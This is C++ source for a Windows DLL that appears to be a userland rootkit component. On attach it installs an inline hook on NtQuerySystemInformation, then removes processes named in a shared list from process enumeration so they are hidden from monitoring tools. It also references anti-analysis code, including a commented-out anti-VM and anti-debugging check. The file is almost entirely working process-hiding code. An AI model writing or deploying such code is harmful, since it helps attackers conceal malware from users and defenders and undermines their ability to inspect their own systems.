#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <algorithm>
#include "../include/IPCObjects_File.h"
#include "../include/InlineHook.h"
#include "../include/AntiAnalysis.h"

using namespace std;

typedef NTSTATUS (NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

HookContext g_hookContext = {0};
NtQuerySystemInformation_t pOriginalFunc = NULL;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    // Call original function via the trampoline
    pOriginalFunc = (NtQuerySystemInformation_t)g_hookContext.pTrampoline;
    
    NTSTATUS status = pOriginalFunc(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    
    // Filter only if SystemProcessInformation (5)
    if (SystemInformationClass != 5 || status != 0) {
        return status;
    }
    
    // Read the list of hidden processes
    vector<wstring> hiddenProcs = deserializeWStringVector(L"agentMapped");
    if (hiddenProcs.empty()) {
        return status;
    }
    
    // Traverse the linked list and filter
    PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
    PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;
    
    while (true) {
        bool shouldHide = false;
        
        // Check if process should be hidden
        if (pCurrent->ImageName.Buffer != NULL) {
            wstring processName(pCurrent->ImageName.Buffer, pCurrent->ImageName.Length / sizeof(WCHAR));
            
            // Case-insensitive comparison
            transform(processName.begin(), processName.end(), processName.begin(), ::towlower);
            
            for (const auto& hiddenProc : hiddenProcs) {
                wstring lowerHidden = hiddenProc;
                transform(lowerHidden.begin(), lowerHidden.end(), lowerHidden.begin(), ::towlower);
                
                if (processName == lowerHidden) {
                    shouldHide = true;
                    break;
                }
            }
        }
        
        if (shouldHide) {
            // UNLINK: Remove this process from the list
            if (pPrevious == NULL) {
                // First element
                if (pCurrent->NextEntryOffset == 0) {
                    // Only element
                    break;
                } else {
                    // Move to next
                    SystemInformation = (PUCHAR)pCurrent + pCurrent->NextEntryOffset;
                    pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
                    continue;
                }
            } else {
                // Middle/end element
                if (pCurrent->NextEntryOffset == 0) {
                    // Last element
                    pPrevious->NextEntryOffset = 0;
                    break;
                } else {
                    // Skip this node
                    pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pPrevious + pPrevious->NextEntryOffset);
                    continue;
                }
            }
        }
        
        // Move to next
        if (pCurrent->NextEntryOffset == 0) break;
        pPrevious = pCurrent;
        pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
    }
    
    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    
    switch (dwReason) {
        
    case DLL_PROCESS_ATTACH:
        {
            // Anti-VM and anti-debugging check
            // if (!isSafeEnvironment()) {
            //     return FALSE;
            // }
            
            DisableThreadLibraryCalls(hModule);
            
            // Get the address of NtQuerySystemInformation
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (!hNtdll) {
                OutputDebugStringW(L"[processHooks] Failed to get ntdll.dll");
                return FALSE;
            }
            
            PVOID pNtQSI = (PVOID)GetProcAddress(hNtdll, "NtQuerySystemInformation");
            if (!pNtQSI) {
                OutputDebugStringW(L"[processHooks] Failed to get NtQuerySystemInformation");
                return FALSE;
            }
            
            // Install the inline hook
            if (InstallInlineHook(pNtQSI, (PVOID)HookedNtQuerySystemInformation, &g_hookContext)) {
                OutputDebugStringW(L"[processHooks] Inline Hook installed successfully");
            } else {
                OutputDebugStringW(L"[processHooks] Failed to install inline hook");
                return FALSE;
            }
        }
        break;
        
    case DLL_PROCESS_DETACH:
        // Remove the hook
        UninstallInlineHook(&g_hookContext);
        break;
    }
    
    return TRUE;
}
